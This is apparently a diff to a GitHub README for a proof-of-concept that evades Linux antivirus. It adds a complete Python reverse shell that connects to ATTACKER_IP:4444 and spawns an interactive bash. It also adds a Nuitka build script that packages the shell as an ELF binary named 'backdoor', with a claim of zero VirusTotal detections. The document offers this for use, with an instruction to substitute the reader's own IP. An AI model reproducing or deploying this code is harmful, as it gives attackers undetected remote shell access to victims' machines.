@@ -22,7 +22,8 @@ This proof-of-concept demonstrates a method to bypass antivirus detection on Lin
 | `payload.py` | Python reverse shell |
 | `build.sh` | Simple build script using Nuitka |
 | `dist/payload` | Final compiled ELF binary |
-| `vt-scan.txt` | VirusTotal scan result showing 0 detections |
+| `vt-scan.jpg` | VirusTotal scan result showing 0 detections |
+| `backdoor` | The Backdoor in the virus total sha256: df60a181ceba07d35350fb7d754f239685996b40ea24d155a82344f7fd52b651
 
 ---
 
@@ -35,3 +36,32 @@ pip3 install nuitka
 
 # Compile the Python file into an ELF binary
 bash build.sh
+```
+---
+## 🐍 payload.py
+```bash
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("ATTACKER_IP",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+```
+Replace ATTACKER_IP with your ip 
+---
+## 🔨 build.sh
+```bash
+#!/bin/bash
+
+python -m nuitka --onefile --standalone --remove-output --output-filename=backdoor backdoor.py
+mkdir -p dist
+mv backdoor dist/payload
+```
+---
+👤 Credits
+
+Discovered and developed by:
+Mohamed Aly (00xCanelo)
+🔗 https://github.com/00xCanelo
+```
